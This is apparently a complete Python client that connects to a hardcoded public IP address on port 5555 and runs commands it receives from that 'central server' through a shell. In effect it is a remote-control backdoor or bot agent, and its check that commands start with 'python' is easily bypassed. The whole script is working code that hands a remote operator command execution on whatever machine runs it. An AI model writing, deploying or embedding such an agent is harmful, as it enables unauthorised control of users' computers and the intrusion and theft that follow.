import socket
import subprocess
import threading

# Define the central server address and port
SERVER_HOST = '52.40.66.242'
SERVER_PORT = 5555

def receive_commands(client_socket):
    while True:
        try:
            command = client_socket.recv(1024).decode()
            if not command:
                break
            if command.strip().startswith("python"):                
                print(f"Received command: {command}")
                result = subprocess.getoutput(command)
                print("Command output:\n", result)
            else:
                print("Redundant command")
        except ConnectionError:
            print("Disconnected from the server.")
            break

def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((SERVER_HOST, SERVER_PORT))
    print("Connected to the central server. Type 'exit' to disconnect.")
    command_receiver = threading.Thread(target=receive_commands, args=(client_socket,))
    command_receiver.start()

if __name__ == "__main__":
    main()
